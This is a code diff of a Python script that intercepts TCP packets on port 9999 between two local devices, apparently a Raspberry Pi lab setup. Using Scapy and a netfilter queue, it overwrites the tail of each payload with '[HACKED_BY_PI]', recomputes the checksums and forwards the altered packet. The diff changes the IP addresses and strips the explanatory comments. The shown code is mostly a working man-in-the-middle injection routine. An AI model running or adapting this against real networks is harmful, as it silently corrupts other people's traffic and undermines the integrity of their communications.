@@ -8,8 +8,8 @@ from threading import Thread
 import time
 
 # Config
-PI_IP = "192.168.165.15"
-DISPLAY_IP = "192.168.165.16"
+PI_IP = "192.168.157.15"
+DISPLAY_IP = "192.168.157.16"
 TARGET_PORT = 9999
 DEBUG = True
 NUM_WORKERS = 4  # Số luồng xử lý song song
@@ -30,24 +30,19 @@ def handle_packet(pkt):
                 if DEBUG:
                     print(f"[+] Intercepted payload: {payload}")
 
-                # Sửa payload
                 inject_text = b"[HACKED_BY_PI]\n"
                 max_len = len(payload)
 
-                # Cắt từ payload để giữ nguyên độ dài tổng thể
                 cut_len = len(inject_text)
                 trimmed_payload = payload[:-cut_len] if len(payload) >= cut_len else b""
 
-                # Gộp lại: giữ nguyên độ dài
                 new_payload = trimmed_payload + inject_text
                 scapy_pkt[Raw].load = new_payload
 
-                # Xóa checksum để Scapy tự tính lại
                 del scapy_pkt[IP].len
                 del scapy_pkt[IP].chksum
                 del scapy_pkt[TCP].chksum
 
-                # Gửi lại gói đã sửa
                 pkt.set_payload(bytes(scapy_pkt))
                 pkt.accept()
 
@@ -55,7 +50,6 @@ def handle_packet(pkt):
                     print(f"[+] Modified and forwarded.")
                 return
 
-        # Không phải gói cần sửa
         pkt.accept()
 
     except Exception as e:
